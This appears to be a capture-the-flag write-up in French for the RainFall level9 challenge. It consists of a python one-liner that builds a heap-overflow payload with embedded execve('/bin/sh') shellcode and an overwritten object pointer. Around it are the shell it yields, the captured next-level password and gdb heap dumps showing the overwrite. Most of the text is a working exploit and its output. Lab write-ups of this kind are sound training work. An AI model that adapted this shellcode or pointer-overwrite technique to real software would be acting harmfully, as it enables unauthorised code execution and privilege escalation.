level9@RainFall:~$ ./level9 $(python -c "print 'A'*4 + '\x90'*8 + '\x28\xa0\x04\x08' + '\x90'*12 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh' + '\x90'*35 + '\x18\xa0\x04\x08'")
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

ret d'un pointeur de pointeur sur pointeur (uu).
Breakpoint 1, 0x08048677 in main ()
(gdb) x/60xw 0x0804a008
0x804a008:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a068:	0x00000000	0x00000000	0x00000005	0x00000071
0x804a078:	0x08048848	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
0x804a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
(avant la fin de l'appel a setAnnotation)
(gdb) x/60xw 0x0804a008
0x804a008:	0x08048848	0x41414141	0x90909090	0x90909090
0x804a018:	0x0804a028	0x90909090	0x90909090	0x90909090
0x804a028:	0x895e1feb	0xc0310876	0x89074688	0x0bb00c46
0x804a038:	0x4e8df389	0x0c568d08	0xdb3180cd	0xcd40d889
0x804a048:	0xffdce880	0x622fffff	0x732f6e69	0x90909068
0x804a058:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a068:	0x90909090	0x90909090	0x90909090	0x90909090
0x804a078:	0x0804a018	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0c8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0d8:	0x00000000	0x00000000	0x00000006	0x00020f21
0x804a0e8:	0x00000000	0x00000000	0x00000000	0x00000000
(apres le retour de la fonction setAnnotation)
payload: [2eme adresse] + [shellcode] + '35 char jusqu'a 0x804a078' + [adresse sur laquelle pointe la deuxieme adresse]
